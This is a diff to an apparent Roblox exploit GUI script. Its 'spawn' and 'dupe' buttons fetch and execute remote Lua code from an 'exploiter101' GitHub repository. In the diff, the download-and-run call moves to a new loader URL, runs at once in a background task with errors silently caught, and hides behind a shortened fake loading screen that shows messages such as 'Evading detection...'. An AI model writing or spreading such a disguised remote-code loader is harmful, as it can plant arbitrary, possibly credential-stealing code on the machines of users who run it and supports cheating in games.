@@ -405,6 +405,8 @@ minimizeBtn.MouseButton1Click:Connect(function()
 	if not minimized then minimize() else restore() end
 end)
 
+
+
 -- HELPER: Show a loading screen for 13 seconds, then execute the given function
 local function showRedirectLoadingScreen(callback)
     local redirectGui = Instance.new("ScreenGui")
@@ -432,7 +434,7 @@ local function showRedirectLoadingScreen(callback)
     label.Position = UDim2.new(0, 0, 0, 0)
     label.BackgroundTransparency = 1
     label.Font = Enum.Font.GothamBold
-    label.Text = "Bypassing Roblox Anti-Cheat Systems..."
+    label.Text = "Executing the scripts..."
     label.TextSize = 28
     label.TextColor3 = Color3.fromRGB(255, 200, 100) -- changed to orange
     label.TextStrokeTransparency = 0.7
@@ -456,11 +458,13 @@ local function showRedirectLoadingScreen(callback)
     TweenService:Create(sublabel, TweenInfo.new(0.27, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
     wait(0.48)
 
+    
+
     -- Animate "Bypassing Roblox Anti-Cheat Systems..." with dots cycling, for 13 seconds (8+5)
-    local redirectTime = 13
+    local redirectTime = 6
     local steps = 52
     for i = 1, steps do
-        label.Text = "Module Script Launching" .. string.rep(".", (i%4))
+        label.Text = "Script is launching" .. string.rep(".", (i%4))
         sublabel.Text = ({
             [1] = "Establishing secure connection...",
             [2] = "Evading detection...",
@@ -484,16 +488,29 @@ local function showRedirectLoadingScreen(callback)
     if callback then callback() end
 end
 
--- SPAWN BUTTON and DUPE BUTTON now show a loading screen and then redirect to script
 spawnButton.MouseButton1Click:Connect(function()
-    showRedirectLoadingScreen(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHub/refs/heads/main/ZeoHubScript2.lua"))()
+    -- Run the external script right away
+    task.spawn(function()
+        local success, result = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/main/sec2.lua"))()
+        end)
+    end)
+    -- Show loading screen at the same time
+    task.spawn(function()
+        showRedirectLoadingScreen()
     end)
 end)
 
 dupeButton.MouseButton1Click:Connect(function()
-    showRedirectLoadingScreen(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHub/refs/heads/main/ZeoHubScript2.lua"))()
+    -- Run the external script right away
+    task.spawn(function()
+        local success, result = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/main/sec2.lua"))()
+        end)
+    end)
+    -- Show loading screen at the same time
+    task.spawn(function()
+        showRedirectLoadingScreen()
     end)
 end)
 
